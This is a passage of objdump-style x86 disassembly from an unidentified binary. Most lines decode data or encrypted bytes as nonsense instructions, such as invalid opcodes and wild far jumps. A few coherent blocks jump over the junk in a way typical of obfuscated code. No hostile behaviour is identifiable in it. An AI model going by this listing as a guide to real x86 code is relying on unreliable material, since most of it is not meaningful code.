  41b1f2:	sbb    ch,BYTE PTR [eax+ebp*1]
  41b1f5:	imul   ecx,DWORD PTR [ebp-0x67],0x6f
  41b1f9:	gs push ss
  41b1fb:	add    al,0x75
  41b1fd:	or     DWORD PTR [ecx],0x906cba68
  41b203:	gs adc eax,0x9f47814
  41b209:	jp     0x41b218
  41b20b:	popfw  
  41b20d:	dec    ecx
  41b20e:	dec    eax
  41b20f:	push   esi
  41b210:	add    eax,0xe35a1423
  41b215:	jle    0x41b222
  41b217:	je     0x41b1a0
  41b219:	push   edi
  41b21a:	xchg   esi,eax
  41b21b:	mov    BYTE PTR [eax+0x3b],cl
  41b21e:	pop    ecx
  41b21f:	call   0x59739b01
  41b224:	inc    eax
  41b225:	cmc    
  41b226:	ss in  al,dx
  41b228:	out    dx,al
  41b229:	mov    al,0x61
  41b22b:	mov    dh,0x2d
  41b22d:	dec    ebx
  41b22e:	jge    0x41b256
  41b230:	mov    eax,0xde983030
  41b235:	dec    esi
  41b236:	add    bl,0xb6
  41b239:	loopne 0x41b1cd
  41b23b:	ja     0x41b231
  41b23d:	cmp    DWORD PTR [ebp+0x5b],esi
  41b240:	lea    ecx,[edx]
  41b242:	cmp    BYTE PTR [ecx],dh
  41b244:	hlt    
  41b245:	sub    DWORD PTR [eax],ebp
  41b247:	sbb    edi,DWORD PTR [esi-0x29aa1f92]
  41b24d:	mov    eax,ds:0xe62d2bc8
  41b252:	mov    esi,0x198c01fd
  41b257:	out    0xe1,eax
  41b259:	lea    ebx,[ebx+0x4f858798]
  41b25f:	aad    0xc1
  41b261:	pop    DWORD PTR [esi+0x56191110]
  41b267:	mov    DWORD PTR [ecx+0x3782e260],ebx
  41b26d:	emms   
  41b26f:	and    DWORD PTR [ebp-0x2559d081],ebx
  41b275:	int3   
  41b276:	(bad)  
  41b279:	pop    eax
  41b27a:	aas    
  41b27b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b27c:	push   ecx
  41b27d:	inc    ecx
  41b27e:	jno    0x41b205
  41b280:	fs or  ecx,edx
  41b283:	ds cdq 
  41b285:	add    dh,BYTE PTR [edi+0x70]
  41b288:	pop    esi
  41b289:	sbb    DWORD PTR [esi-0x67],edx
  41b28c:	mov    al,ds:0x4c2ba5cc
  41b291:	push   ds
  41b292:	loop   0x41b264
  41b294:	loop   0x41b298
  41b296:	xor    al,0x1d
  41b298:	les    esi,FWORD PTR [ecx]
  41b29a:	sbb    esp,DWORD PTR [edx]
  41b29c:	mov    cl,0x4c
  41b29e:	and    BYTE PTR [eax+0x55d2060b],cl
  41b2a4:	xchg   esp,eax
  41b2a5:	adc    dl,BYTE PTR [eax-0x1c]
  41b2a8:	cmp    eax,0xc1c14a98
  41b2ad:	dec    ecx
  41b2ae:	iret   
  41b2af:	test   eax,0xf0a51e4c
  41b2b4:	out    dx,al
  41b2b5:	out    0xba,eax
  41b2b7:	shl    DWORD PTR [esi],cl
  41b2b9:	xchg   ecx,eax
  41b2ba:	add    BYTE PTR ds:0xc7d1ebd0,ch
  41b2c0:	push   ebp
  41b2c1:	jae    0x41b261
  41b2c3:	jmp    0x41b309
  41b2c5:	push   ebx
  41b2c6:	ficomp DWORD PTR [ecx-0x5c]
  41b2c9:	sub    esp,esi
  41b2cb:	xchg   BYTE PTR [eax-0x7b],dh
  41b2ce:	cmp    BYTE PTR [esi-0x7e],dl
  41b2d1:	das    
  41b2d2:	mov    ah,0x75
  41b2d4:	mov    ?,WORD PTR [ebx-0x7d3e529]
  41b2da:	outs   dx,DWORD PTR ds:[esi]
  41b2db:	icebp  
  41b2dc:	loop   0x41b279
  41b2de:	pop    esi
  41b2df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2e0:	adc    bl,BYTE PTR fs:[ebp+0x58]
  41b2e4:	cmp    cl,al
  41b2e6:	lock jb 0x41b284
  41b2e9:	lahf   
  41b2ea:	xchg   esi,eax
  41b2eb:	jbe    0x41b28a
  41b2ed:	dec    DWORD PTR [esi]
  41b2ef:	xchg   esp,eax
  41b2f0:	dec    eax
  41b2f1:	ss push es
  41b2f3:	jns    0x41b32e
  41b2f5:	add    eax,0x217b7d66
  41b2fa:	stos   DWORD PTR es:[edi],eax
  41b2fb:	clc    
  41b2fc:	mov    ds:0x606b22cd,al
  41b301:	xor    esp,DWORD PTR [esi-0x1c6d62ee]
  41b307:	push   0xd
  41b309:	xchg   ebx,eax
  41b30a:	add    edx,DWORD PTR [ebx-0x314f1cdc]
  41b310:	leave  
  41b311:	ins    DWORD PTR es:[edi],dx
  41b312:	sbb    eax,esi
  41b314:	outs   dx,BYTE PTR ds:[esi]
  41b315:	outs   dx,DWORD PTR ds:[esi]
  41b316:	out    dx,al
  41b317:	inc    ebx
  41b318:	js     0x41b376
  41b31a:	das    
  41b31b:	repz pop eax
  41b31d:	stos   DWORD PTR es:[edi],eax
  41b31e:	popa   
  41b31f:	fadd   st(5),st
  41b321:	jg     0x41b332
  41b323:	out    0x41,al
  41b325:	aam    0xfb
  41b327:	cmp    eax,0x8adce6f6
  41b32c:	test   al,0xf0
  41b32e:	rcl    ecx,cl
  41b330:	xor    DWORD PTR [eax+edx*1+0x404c19fc],eax
  41b337:	scas   eax,DWORD PTR es:[edi]
  41b338:	pop    es
  41b339:	and    eax,0x811070d9
  41b33e:	bnd ja 0x41b2e6
  41b341:	jns    0x41b30d
  41b343:	shrd   edx,eax,0x2
  41b347:	shr    eax,0x2
  41b34a:	mov    DWORD PTR [esp+0x34],eax
  41b34e:	mov    eax,DWORD PTR [esp+0x18]
  41b352:	mov    ecx,DWORD PTR [esp+0x1c]
  41b356:	jmp    0x41b725
  41b35b:	push   ecx
  41b35c:	(bad)  
  41b35e:	or     BYTE PTR ds:0xaa1d2104,bl
  41b364:	sbb    BYTE PTR [ebx+0x7c],dh
  41b367:	push   ds
  41b368:	in     eax,0x2
  41b36a:	push   0xffffffbb
  41b36c:	(bad)  
  41b36d:	push   ss
  41b36e:	sbb    BYTE PTR [edx+edx*1+0x2e671818],bh
  41b375:	lds    ebp,FWORD PTR [eax]
  41b377:	add    ch,al
  41b379:	xchg   esi,eax
  41b37a:	das    
  41b37b:	and    ch,ch
  41b37d:	xor    al,0xef
  41b37f:	mov    ds,WORD PTR [ebx]
  41b381:	inc    ecx
  41b382:	cmp    al,0xbb
  41b384:	sbb    DWORD PTR [edi+0x42],edi
  41b387:	mov    bl,0x77
  41b389:	cli    
  41b38a:	and    DWORD PTR [ecx+ebp*2-0x31cf0094],eax
  41b391:	cmp    ebx,DWORD PTR [eax+0x98341f7]
  41b397:	sbb    al,0x3e
  41b399:	fist   WORD PTR [esi]
  41b39b:	jmp    0x8e3c10c9
  41b3a0:	mov    al,es:0x5be1fd62
  41b3a6:	push   0xffffffab
  41b3a8:	or     DWORD PTR [edi],esi
  41b3aa:	aas    
  41b3ab:	xchg   edx,eax
  41b3ac:	daa    
  41b3ad:	call   0x804def31
  41b3b2:	sar    BYTE PTR [edi-0x56ff97dc],0x61
  41b3b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3ba:	std    
  41b3bb:	retf   
  41b3bc:	cmc    
  41b3bd:	bound  ebx,QWORD PTR [eax-0x1622e2d]
  41b3c3:	and    BYTE PTR ds:0x18bf9ac7,dl
  41b3c9:	or     ecx,esi
  41b3cb:	loopne 0x41b3ab
  41b3cd:	mov    bh,0x34
  41b3cf:	mov    eax,0x55a76957
  41b3d4:	mov    ecx,0x6cf98a36
  41b3d9:	xchg   esi,eax
  41b3da:	xchg   esi,eax
  41b3db:	push   ss
  41b3dc:	adc    ecx,DWORD PTR [eax+0x5c]
  41b3df:	xchg   esp,eax
  41b3e0:	sahf   
  41b3e1:	popa   
  41b3e2:	fimul  WORD PTR [ebx+0x6a]
  41b3e5:	sbb    DWORD PTR [ecx-0x19],edi
  41b3e8:	out    dx,al
  41b3e9:	dec    ebp
  41b3ea:	push   edi
  41b3eb:	pop    es
  41b3ec:	stc    
  41b3ed:	sar    BYTE PTR [edx+0x24],0x89
  41b3f1:	fist   WORD PTR [ebx-0x12]
  41b3f4:	scas   al,BYTE PTR es:[edi]
  41b3f5:	pop    es
  41b3f6:	xor    al,0x9e
  41b3f8:	sbb    ah,BYTE PTR [edi]
  41b3fa:	ret    0xb71e
  41b3fd:	cmc    
  41b3fe:	div    DWORD PTR [esi]
  41b400:	xchg   edi,eax
  41b401:	pop    ebp
  41b402:	out    0x56,al
  41b404:	clc    
  41b405:	jo     0x41b479
  41b407:	aas    
  41b408:	jmp    0xc283dc7f
  41b40d:	xchg   BYTE PTR [eax-0x1ccda0a3],ch
  41b413:	out    dx,al
  41b414:	add    eax,0x106ec0cb
  41b419:	pop    edx
  41b41a:	popf   
  41b41b:	sub    al,0x80
  41b41d:	sbb    edi,edi
  41b41f:	mov    al,0xb8
  41b421:	aad    0x1d
  41b423:	push   ecx
  41b424:	xchg   ecx,eax
  41b425:	inc    esi
  41b426:	adc    BYTE PTR [edi+0x37],0x7b
  41b42a:	adc    ah,bh
  41b42c:	sbb    BYTE PTR [esi],al
  41b42e:	pop    ebp
  41b42f:	xor    eax,0x57858471
  41b434:	xor    BYTE PTR [edi],al
  41b436:	cmovbe ebx,DWORD PTR [eax+edi*8+0x52]
  41b43b:	mov    cl,0x62
  41b43d:	push   esp
  41b43e:	push   0xffffff96
  41b440:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b441:	mov    ax,ds:0x2a709fde
  41b447:	fsub   st(1),st
  41b449:	mov    ch,0xab
  41b44b:	test   al,0xa
  41b44d:	mov    bh,0x74
  41b44f:	lea    ecx,[ebp-0x78d98ebb]
  41b455:	and    esi,edi
  41b457:	(bad)  
  41b458:	cld    
  41b459:	sbb    DWORD PTR [esi],eax
  41b45b:	pushf  
  41b45c:	sub    esp,ebp
  41b45e:	xor    esp,DWORD PTR [ecx+0x13ed1c86]
  41b464:	push   ecx
  41b465:	mov    fs,esi
  41b467:	stos   BYTE PTR es:[edi],al
  41b468:	es fs sub eax,0xa18febaa
  41b46f:	jge    0x41b3fd
  41b471:	dec    edi
  41b472:	mov    dh,BYTE PTR [edi-0x9]
  41b475:	dec    ebx
  41b476:	cmp    BYTE PTR [eax],dh
  41b478:	or     ah,dh
  41b47a:	rol    DWORD PTR ds:0x63115cac,1
  41b480:	arpl   WORD PTR [ecx-0x48],bp
  41b483:	adc    eax,0xce146a3f
  41b488:	std    
  41b489:	sub    dh,bl
  41b48b:	(bad)  
  41b48c:	(bad)  
  41b48d:	rcl    DWORD PTR [edx-0x5d],cl
  41b490:	mov    ebx,0xb99b4e06
  41b495:	or     BYTE PTR [esi],bl
  41b497:	xchg   ecx,eax
  41b498:	sub    eax,0x68e1a5bf
  41b49d:	mov    dh,0x85
  41b49f:	jmp    0x41b4a1
  41b4a1:	adc    ah,al
  41b4a3:	fiadd  WORD PTR [ebp-0x3f4bfa4c]
  41b4a9:	mov    bl,0x16
  41b4ab:	push   es
  41b4ac:	popa   
  41b4ad:	aad    0xa
  41b4af:	es mov ch,0xab
  41b4b2:	or     al,0x51
  41b4b4:	xor    DWORD PTR [ebp+0x1fe713e1],esp
  41b4ba:	ror    eax,1
  41b4bc:	pop    edx
  41b4bd:	les    ebp,FWORD PTR [eax-0x7835fe44]
  41b4c3:	xchg   ebp,eax
  41b4c4:	sbb    BYTE PTR [ebx-0x45],0xcd
  41b4c8:	xchg   edi,eax
  41b4c9:	xchg   BYTE PTR [edi-0x5a],bh
  41b4cc:	jns    0x41b499
  41b4ce:	div    BYTE PTR [esi]
  41b4d0:	pop    edx
  41b4d1:	cdq    
  41b4d2:	pusha  
  41b4d3:	sub    DWORD PTR [ecx],esp
  41b4d5:	adc    BYTE PTR [ecx],al
  41b4d7:	out    dx,eax
  41b4d8:	and    ebx,DWORD PTR [esi]
  41b4da:	lahf   
  41b4db:	test   BYTE PTR [eax],dh
  41b4dd:	lods   al,BYTE PTR es:[esi]
  41b4df:	xor    eax,esi
  41b4e1:	sbb    eax,0x79433579
  41b4e6:	mov    gs,edx
  41b4e8:	clc    
  41b4e9:	and    DWORD PTR [eax+0x63],0x4d
  41b4ed:	mov    ebp,0x3aff9eec
  41b4f2:	or     BYTE PTR [edi*4+0x65e68196],dl
  41b4f9:	pop    edi
  41b4fa:	cld    
  41b4fb:	xchg   esi,eax
  41b4fc:	int    0xce
  41b4fe:	ret    0x1530
  41b501:	xor    ch,cl
  41b503:	inc    eax
  41b504:	sar    DWORD PTR [ecx+0x4655c167],cl
  41b50a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b50b:	out    dx,al
  41b50c:	ja     0x41b548
  41b50e:	mov    DWORD PTR ss:[edi],eax
  41b511:	sub    ecx,esp
  41b513:	int    0xa6
  41b515:	pop    esi
  41b516:	xor    dl,BYTE PTR [edi+0x5d]
  41b519:	xor    al,0x1
  41b51b:	div    BYTE PTR [ecx+0x7cc76d15]
  41b521:	(bad)  
  41b522:	icebp  
  41b523:	cdq    
  41b524:	rcl    DWORD PTR [esp+ecx*2-0x5d],1
  41b528:	and    esp,edx
  41b52a:	daa    
  41b52b:	out    0xd2,eax
  41b52d:	(bad)  
  41b52f:	sbb    al,0x53
  41b531:	add    DWORD PTR [ebp-0x6dfb2257],ebp
  41b537:	jns    0x41b55f
  41b539:	fsubr  st(3),st
  41b53b:	data16 (bad) 
  41b53d:	std    
  41b53e:	push   0x7128d2d4
  41b543:	data16 arpl cx,si
  41b546:	sub    eax,0xa2e05780
  41b54b:	in     al,dx
  41b54c:	jnp    0x41b5b3
  41b54e:	dec    esi
  41b54f:	int    0xcf
  41b551:	pop    edi
  41b552:	dec    edi
  41b553:	mov    bh,0xc3
  41b555:	fdiv   QWORD PTR ds:0x4edfecce
  41b55b:	cmp    BYTE PTR [ebx+0x48f89f3c],0xa0
  41b562:	sbb    eax,0x4103a4eb
  41b567:	fsubr  st,st(0)
  41b569:	and    al,0xda
  41b56b:	jne    0x41b586
  41b56d:	jae    0x41b5b6
  41b56f:	mov    edx,0x12e8ce83
  41b574:	mov    fs,edx
  41b576:	or     esp,esi
  41b578:	sub    al,ah
  41b57a:	jle    0x41b51f
  41b57c:	push   esp
  41b57d:	mov    esi,0x7e1e3001
  41b582:	xlat   BYTE PTR ds:[ebx]
  41b583:	and    DWORD PTR [ebp+0x10],ecx
  41b586:	fxch   st(3)
  41b588:	adc    eax,0x996c73b2
  41b58d:	mov    esp,0x8cf629d4
  41b592:	dec    ebp
  41b593:	dec    ebx
  41b594:	xor    BYTE PTR [esi-0x6e],cl
  41b597:	xchg   dh,ch
  41b599:	inc    edi
  41b59a:	push   es
  41b59b:	and    DWORD PTR [ebx],ebp
  41b59d:	dec    eax
  41b59e:	adc    edx,ebx
  41b5a0:	retf   
  41b5a1:	fwait
  41b5a2:	mov    al,0x7b
  41b5a4:	push   eax
  41b5a5:	mov    ebx,0x72f20139
  41b5aa:	scas   eax,DWORD PTR es:[edi]
  41b5ab:	jns    0x41b59d
  41b5ad:	mov    ebx,0x446c8afa
  41b5b2:	lods   eax,DWORD PTR ds:[esi]
  41b5b3:	jo     0x41b60a
  41b5b5:	mov    bl,0xae
  41b5b7:	push   esi
  41b5b8:	fadd   DWORD PTR [esi]
  41b5ba:	fcomp  DWORD PTR [esp+edi*2-0x7efa96ae]
  41b5c1:	inc    edi
  41b5c2:	adc    esi,esp
  41b5c4:	cmc    
  41b5c5:	iret   
  41b5c6:	inc    esp
  41b5c7:	sti    
  41b5c8:	mov    ah,0x3f
  41b5ca:	pop    ss
  41b5cb:	in     al,dx
  41b5cc:	mov    cl,0xb
  41b5ce:	sbb    dh,ah
  41b5d0:	pusha  
  41b5d1:	rcr    BYTE PTR [edx-0x686eae9f],cl
  41b5d7:	retf   
  41b5d8:	cmp    al,0x44
  41b5da:	mov    al,0x3e
  41b5dc:	repz aad 0xa0
  41b5df:	out    dx,al
  41b5e0:	nop
  41b5e1:	mov    DWORD PTR [edx-0x4b],edi
  41b5e4:	mov    BYTE PTR ds:0x1acbf79a,0x55
  41b5eb:	xchg   esi,eax
  41b5ec:	(bad)  
  41b5ee:	callw  0x3924
  41b5f2:	lock dec ecx
  41b5f4:	data16 aaa 
  41b5f6:	sbb    eax,0xff5643cb
  41b5fb:	lahf   
  41b5fc:	push   ss
  41b5fd:	cdq    
  41b5fe:	jge    0x41b672
  41b600:	popa   
  41b601:	mov    esp,0xf37df441
  41b606:	jbe    0x41b5fb
  41b608:	loopne 0x41b593
  41b60a:	sbb    al,0xc3
  41b60c:	mov    ecx,0x2c60b078
  41b611:	pop    ebx
  41b612:	idiv   BYTE PTR [eax+0xb9ef404]
  41b618:	mov    ebp,0xb28b6430
  41b61d:	aad    0x8c
  41b61f:	or     DWORD PTR [edx+0x2e8b7f66],0xffffffa6
  41b626:	sub    edi,DWORD PTR [eax+0x4f8a3de0]
  41b62c:	stc    
  41b62d:	(bad)  
  41b62e:	imul   ebx,DWORD PTR [ecx+0x74dc976],0x1b328582
  41b638:	fst    QWORD PTR [ecx-0x57ec2c67]
  41b63e:	xchg   BYTE PTR [eax+edi*2+0x9],dh
  41b642:	mov    cl,0x95
  41b644:	mov    WORD PTR [edi],?
  41b646:	aas    
  41b647:	cmp    BYTE PTR [esi-0xc],bl
  41b64a:	stos   DWORD PTR es:[edi],eax
  41b64b:	or     BYTE PTR [edi],dh
  41b64d:	ja     0x41b613
  41b64f:	sbb    dl,BYTE PTR [esi-0x28b0cbee]
  41b655:	pop    edx
  41b656:	cld    
  41b657:	adc    ch,0x6
  41b65a:	cmp    ch,ah
  41b65c:	shl    BYTE PTR [eax+edi*1],cl
  41b65f:	call   0x8be3:0x593169c1
  41b666:	sub    edx,eax
  41b668:	in     eax,dx
  41b669:	push   esi
  41b66a:	adc    ah,BYTE PTR [ecx-0x1c839390]
  41b670:	test   dl,dh
  41b672:	sbb    ecx,DWORD PTR fs:[eax-0x3cb567c1]
  41b679:	in     al,dx
  41b67a:	nop
  41b67b:	out    dx,al
  41b67c:	cli    
  41b67d:	dec    edx
  41b67e:	or     DWORD PTR [eax+0x1ff3b96d],ebx
  41b684:	frstor [ecx]
  41b686:	push   esp
  41b687:	nop
  41b688:	bound  edx,QWORD PTR gs:[eax-0x2c]
  41b68c:	and    dl,ah
  41b68e:	push   edi
  41b68f:	mov    al,0x3e
  41b691:	mov    eax,0xbf71187c
  41b696:	fmul   DWORD PTR [ecx]
  41b698:	sti    
  41b699:	jmp    0x5580:0xdd849dfb
  41b6a0:	(bad)  
  41b6a2:	loope  0x41b714
  41b6a4:	dec    esp
  41b6a5:	call   DWORD PTR [ebp+0x61]
  41b6a8:	add    BYTE PTR [ecx-0x65],ch
  41b6ab:	cld    
  41b6ac:	dec    ebx
  41b6ad:	pop    edi
  41b6ae:	clc    
  41b6af:	push   ebx
  41b6b0:	jl     0x41b641
  41b6b2:	rcr    BYTE PTR [ecx],cl
  41b6b4:	(bad)  
  41b6b6:	ins    DWORD PTR es:[edi],dx
  41b6b7:	ins    BYTE PTR es:[edi],dx
  41b6b8:	xchg   BYTE PTR [edi],ch
  41b6ba:	jae    0x41b700
  41b6bc:	(bad)  
  41b6bd:	mov    al,ds:0xbaa4dbb6
  41b6c2:	mov    ecx,0x8aa25d9b
  41b6c7:	aad    0x43
  41b6c9:	xor    dh,BYTE PTR [edx]
  41b6cb:	mov    eax,0x5da51550
  41b6d0:	cdq    
  41b6d1:	jbe    0x41b742
  41b6d3:	rcr    ah,0x17
  41b6d6:	in     eax,dx
  41b6d7:	cmc    
  41b6d8:	mov    bl,0x9b
  41b6da:	dec    esi
  41b6db:	mov    BYTE PTR [edx+0x45],cl
  41b6de:	inc    edi
  41b6df:	inc    esi
  41b6e0:	retf   0x45a3
  41b6e3:	lahf   
  41b6e4:	lahf   
  41b6e5:	shr    edi,cl
  41b6e7:	nop
  41b6e8:	xchg   DWORD PTR [eax-0x6d0371ea],edi
  41b6ee:	loope  0x41b6b2
  41b6f0:	rol    dh,cl
  41b6f2:	mov    ecx,0xe32b48f3
  41b6f7:	sbb    BYTE PTR [esi],cl
  41b6f9:	in     al,dx
  41b6fa:	loopne 0x41b6e6
  41b6fc:	sar    BYTE PTR [eax],0x5e
  41b6ff:	in     al,0xde
  41b701:	or     eax,0x13c8b5fe
  41b706:	push   0x52775a6c
  41b70b:	adc    DWORD PTR [ecx],ebp
  41b70d:	cwde   
  41b70e:	(bad)  
  41b70f:	cs into 
  41b711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b712:	sbb    ecx,eax
  41b714:	and    esi,DWORD PTR [edx+0x63a5a7ae]
  41b71a:	and    edx,DWORD PTR [eax+0x1b30a578]
  41b720:	pusha  
  41b721:	std    
  41b722:	rcl    edx,0xc5
  41b725:	shl    eax,0x1e
  41b728:	xor    eax,0x40000000
  41b72d:	or     eax,DWORD PTR [esp+0x34]
  41b731:	xor    ecx,ecx
  41b733:	mov    DWORD PTR [esp+0x14],eax
  41b737:	mov    eax,DWORD PTR [esp+0x60]
  41b73b:	or     ecx,edx
  41b73d:	cdq    
  41b73e:	cmp    ecx,eax
  41b740:	jne    0x41d926
  41b746:	cmp    DWORD PTR [esp+0x14],edx
  41b74a:	jne    0x41d926
  41b750:	mov    DWORD PTR [esp+0x5c],0x4225f4
  41b758:	mov    DWORD PTR [esp+0x68],0x4225ec
  41b760:	mov    eax,DWORD PTR [esp+0x78]
  41b764:	mov    eax,DWORD PTR [esp+0x78]
  41b768:	mov    edx,DWORD PTR [esp+0x18]
  41b76c:	xor    ecx,ecx
  41b76e:	shld   ecx,eax,0x2
  41b772:	shl    eax,0x2
  41b775:	mov    DWORD PTR [esp+0x10],edx
  41b779:	mov    edx,DWORD PTR [esp+0x1c]
  41b77d:	xor    eax,ebx
  41b77f:	xor    ecx,esi
  41b781:	mov    DWORD PTR [esp+0x14],edx
  41b785:	cmp    DWORD PTR [esp+0x10],eax
  41b789:	jne    0x41c8ee
  41b78f:	cmp    edx,ecx
  41b791:	jne    0x41c8ee
  41b797:	mov    DWORD PTR [esp+0x30],0x42257c
  41b79f:	mov    eax,DWORD PTR [esp+0x18]
  41b7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41b7a7:	shrd   eax,ecx,0x2
  41b7ab:	shr    ecx,0x2
  41b7ae:	mov    ecx,DWORD PTR [esp+0x18]
  41b7b2:	mov    edx,DWORD PTR [esp+0x1c]
  41b7b6:	mov    edx,DWORD PTR [esp+0x30]
  41b7ba:	mov    edx,DWORD PTR [edx+0xc]
  41b7bd:	mov    DWORD PTR [esp+0xc],eax
  41b7c1:	shl    ecx,0x1e
  41b7c4:	mov    eax,0x329e695d
  41b7c9:	xor    DWORD PTR [esp+0xc],eax
  41b7cd:	xor    ecx,ecx
  41b7cf:	or     ecx,DWORD PTR [esp+0xc]
  41b7d3:	cmp    ecx,DWORD PTR [edx]
  41b7d5:	jne    0x41c888
  41b7db:	mov    ecx,0x65c7
  41b7e0:	mov    WORD PTR [esp+0x2c],cx
  41b7e5:	mov    ecx,0x6062
  41b7ea:	mov    WORD PTR [esp+0x24],cx
  41b7ef:	mov    ecx,0x125d
  41b7f4:	mov    WORD PTR [esp+0xc],cx
  41b7f9:	movzx  ecx,WORD PTR [esp+0xc]
  41b7fe:	mov    edx,0x2d0f
  41b803:	jmp    0x41bbd2
  41b808:	push   edi
  41b809:	and    BYTE PTR [ebx+0x236a9a6f],bh
  41b80f:	and    BYTE PTR [edx+0x3daa298c],dh
  41b815:	mov    bh,0xf4
  41b817:	push   0x5e
  41b819:	mov    DWORD PTR [esi],edx
  41b81b:	sbb    BYTE PTR [edx+edx*1+0x63ee1818],bh
  41b822:	jge    0x41b84c
  41b824:	sub    al,0xa4
  41b826:	sub    esi,edx
  41b828:	push   esi
  41b829:	pusha  
  41b82a:	or     bh,ch
  41b82c:	and    eax,DWORD PTR [edi+0x488a9866]
  41b832:	(bad)  
  41b833:	and    eax,DWORD PTR [ebx-0x216c3df9]
  41b839:	(bad)  
  41b83a:	xchg   ebx,eax
  41b83b:	dec    eax
  41b83c:	inc    edx
  41b83d:	sbb    BYTE PTR [edi-0x18282bff],ch
  41b843:	fstp   QWORD PTR ds:0x50392ae5
  41b849:	or     esi,0xfffffff9
  41b84c:	mov    al,0xd9
  41b84e:	mov    bh,0x52
  41b850:	in     eax,dx
  41b851:	es es out dx,al
  41b854:	leave  
  41b855:	pop    ds
  41b856:	inc    eax
  41b857:	push   cs
  41b858:	and    ebx,DWORD PTR [esi]
  41b85a:	(bad)  [edx+ebx*4-0x49c957ae]
  41b861:	lods   al,BYTE PTR ds:[esi]
  41b862:	in     al,dx
  41b863:	xchg   ebx,eax
  41b864:	mul    DWORD PTR [edx-0x390705be]
  41b86a:	aad    0x58
  41b86c:	in     al,dx
  41b86d:	sbb    DWORD PTR [ebx],ebp
  41b86f:	add    DWORD PTR [edx-0x77],ebp
  41b872:	iret   
  41b873:	je     0x41b877
  41b875:	sahf   
  41b876:	repnz inc ebp
  41b878:	pop    esp
  41b879:	fldcw  WORD PTR [ebp-0x7aa362dd]
  41b87f:	jge    0x41b84e
  41b881:	xor    al,0x2b
  41b883:	ins    DWORD PTR es:[edi],dx
  41b884:	mov    bl,0xcf
  41b886:	sub    DWORD PTR [esp+edx*2-0x63c0ac9],esp
  41b88d:	popf   
  41b88e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b88f:	or     DWORD PTR [edx],esi
  41b891:	imul   ebx,ebp,0x55269c7c
  41b897:	xchg   ebp,eax
  41b898:	ret    
  41b899:	mov    WORD PTR [edx+0x6e427c6a],ss
  41b89f:	imul   ebx,edx,0x54d8c1ee
  41b8a5:	arpl   WORD PTR [ebp-0x3b],dx
  41b8a8:	outs   dx,BYTE PTR ds:[esi]
  41b8a9:	add    bh,BYTE PTR ds:0x80df2bf3
  41b8af:	jmp    0x2040:0x3dcd3fa1
  41b8b6:	xchg   esp,eax
  41b8b7:	mov    bh,0xdc
  41b8b9:	xor    edx,ecx
  41b8bb:	xor    dl,0x61
  41b8be:	sub    edi,DWORD PTR [ecx-0x4e]
  41b8c1:	dec    DWORD PTR [ebp+0x54a6d1e7]
  41b8c7:	xchg   esi,eax
  41b8c8:	lods   eax,DWORD PTR ds:[esi]
  41b8c9:	arpl   di,di
  41b8cb:	test   DWORD PTR fs:[ebx+ebp*8+0xed0eaca],esp
  41b8d3:	mov    esi,0xcc5e08a0
  41b8d8:	push   ecx
  41b8d9:	dec    edi
  41b8da:	out    0x60,eax
  41b8dc:	inc    ebx
  41b8dd:	pop    es
  41b8de:	pop    esi
  41b8df:	pushf  
  41b8e0:	cld    
  41b8e1:	or     bl,BYTE PTR [ecx+0x61]
  41b8e4:	int    0x56
  41b8e6:	outs   dx,DWORD PTR ds:[esi]
  41b8e7:	jp     0x41b92c
  41b8e9:	rcl    BYTE PTR [eax],cl
  41b8eb:	sbb    eax,0x96d08642
  41b8f0:	mov    eax,ds:0x9d90862e
  41b8f5:	xor    BYTE PTR [ebx+0x7d],0x11
  41b8f9:	addr16 jp 0x41b90d
  41b8fc:	mov    ch,0x73
  41b8fe:	call   0x9ff16023
  41b903:	pop    ds
  41b904:	lahf   
  41b905:	fisubr WORD PTR [eax-0x7e9897e9]
  41b90b:	xchg   edi,eax
  41b90c:	or     eax,0xf57a974e
  41b911:	sbb    al,0xb5
  41b913:	je     0x41b90b
  41b915:	push   0x4d
  41b917:	mov    bh,0xeb
  41b919:	jl     0x41b953
  41b91b:	sar    BYTE PTR [eax+ecx*2-0x53],cl
  41b91f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b920:	mov    edi,0x4e2ae0e4
  41b925:	outs   dx,DWORD PTR ds:[esi]
  41b926:	lods   eax,DWORD PTR ds:[esi]
  41b927:	jge    0x41b9a8
  41b929:	fbstp  TBYTE PTR [ebx]
  41b92b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b92c:	(bad)  
  41b92d:	clc    
  41b92e:	or     DWORD PTR [ecx-0x131afbab],ecx
  41b934:	inc    edi
  41b935:	sbb    BYTE PTR [ecx],bl
  41b937:	cmc    
  41b938:	cld    
  41b939:	xchg   ebx,eax
  41b93a:	mov    ds:0xb8a7b9e,eax
  41b93f:	loop   0x41b987
  41b941:	outs   dx,BYTE PTR ds:[esi]
  41b942:	in     eax,dx
  41b943:	add    eax,0x37636d49
  41b948:	cdq    
  41b949:	cmp    DWORD PTR [ebp-0x3c],0x47
  41b94d:	push   eax
  41b94e:	outs   dx,DWORD PTR ds:[esi]
  41b94f:	shr    BYTE PTR [ebx],1
  41b951:	pop    edi
  41b952:	mov    bl,0x3a
  41b954:	in     eax,0x90
  41b956:	loope  0x41b903
  41b958:	or     BYTE PTR [esi],bh
  41b95a:	je     0x41b9bd
  41b95c:	mov    eax,DWORD PTR [edx]
  41b95e:	(bad)  
  41b95f:	loop   0x41b9a1
  41b961:	sbb    al,0x11
  41b963:	xlat   BYTE PTR ds:[ebx]
  41b964:	test   eax,0xce7407a9
  41b969:	(bad)  
  41b96a:	push   ebx
  41b96b:	jecxz  0x41b99b
  41b96d:	jo     0x41b94d
  41b96f:	popf   
  41b970:	cmc    
  41b971:	repnz push edi
  41b973:	addr16 cmp eax,0xc086a272
  41b979:	jae    0x41b98c
  41b97b:	sar    esp,cl
  41b97d:	ret    
  41b97e:	imul   eax,eax,0xffffff95
  41b981:	pop    ss
  41b982:	add    DWORD PTR [eax],edx
  41b984:	xor    cl,BYTE PTR [ebx-0x3cb75592]
  41b98a:	pop    edx
  41b98b:	pop    esp
  41b98c:	adc    BYTE PTR ds:0x9a1ac639,al
  41b992:	pop    ss
  41b993:	xor    bh,dl
  41b995:	xchg   esi,eax
